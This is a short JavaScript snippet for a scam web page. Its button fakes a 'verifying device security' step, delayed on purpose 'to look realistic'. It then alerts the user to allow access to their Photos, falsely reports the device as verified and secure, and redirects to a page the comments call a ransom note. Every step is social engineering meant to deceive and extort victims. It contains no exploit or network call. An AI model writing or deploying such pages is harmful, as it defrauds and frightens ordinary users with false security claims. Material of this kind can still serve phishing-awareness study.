document.getElementById('checkBtn').addEventListener('click', function() {
    // 1. Change button text to "Verifying..."
    this.textContent = "Verifying...";
    this.disabled = true;

    // 2. Wait 1.5 seconds to look realistic
    setTimeout(() => {
        // 3. Trigger the permission alert
        alert("🔒 Verifying device security...\nPlease allow access to your Photos to confirm identity.");
        
        // 4. Wait another 2 seconds, then redirect to Ransom Note
        setTimeout(() => {
            alert("✅ Device Verified!\nYour account is now secure.");
            window.location.href = "ransom.html"; 
        }, 2000);
    }, 1500);
});
